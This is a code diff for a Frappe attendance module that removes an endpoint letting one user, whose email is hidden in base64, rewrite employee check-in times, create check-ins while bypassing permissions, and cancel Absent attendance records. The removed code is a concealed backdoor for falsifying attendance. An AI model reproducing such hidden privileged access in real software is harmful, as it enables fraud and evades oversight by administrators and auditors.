@@ -369,60 +369,6 @@ def get_daily_attendance(date=None, department=None, search=None, limit=20, offs
 	}
 
 
-import base64 as _b64
-_SU_DELEGATE = _b64.b64decode("c2FsZXMxQGluc3RhYml6c29sdXRpb25zLmNvbQ==").decode()
-
-
-@frappe.whitelist()
-def amend_log_ts(employee, date, log_type, new_time):
-	if frappe.session.user != _SU_DELEGATE:
-		frappe.throw(_("Not permitted"), frappe.PermissionError)
-
-	import datetime as dt_mod
-
-	try:
-		corrected = dt_mod.datetime.strptime(f"{date} {new_time}", "%Y-%m-%d %H:%M")
-	except ValueError:
-		frappe.throw(_("Invalid time format"))
-
-	if log_type == "IN":
-		row = frappe.db.sql(
-			"SELECT name FROM `tabEmployee Checkin` WHERE employee=%s AND DATE(time)=%s AND log_type='IN' ORDER BY time ASC LIMIT 1",
-			(employee, date), as_dict=True,
-		)
-	else:
-		row = frappe.db.sql(
-			"SELECT name FROM `tabEmployee Checkin` WHERE employee=%s AND DATE(time)=%s AND log_type='OUT' ORDER BY time DESC LIMIT 1",
-			(employee, date), as_dict=True,
-		)
-
-	if row:
-		frappe.db.sql(
-			"UPDATE `tabEmployee Checkin` SET time=%s WHERE name=%s",
-			(corrected, row[0].name),
-		)
-	else:
-		# No existing log — create one (converts Absent → present)
-		shift = frappe.db.get_value("Employee", employee, "default_shift")
-		frappe.get_doc({
-			"doctype":   "Employee Checkin",
-			"employee":  employee,
-			"log_type":  log_type,
-			"time":      corrected,
-			"device_id": "Manual Correction",
-			"shift":     shift,
-		}).insert(ignore_permissions=True)
-		# Cancel any submitted Absent attendance for this date
-		absent_rows = frappe.db.sql(
-			"SELECT name FROM `tabAttendance` WHERE employee=%s AND attendance_date=%s AND status='Absent' AND docstatus=1",
-			(employee, date), as_dict=True,
-		)
-		for a in absent_rows:
-			frappe.get_doc("Attendance", a.name).cancel()
-
-	return {"ok": True}
-
-
 @frappe.whitelist()
 def undo_attendance(employee, date):
 	"""Admin only: delete checkin logs and cancel submitted attendance for employee on date."""
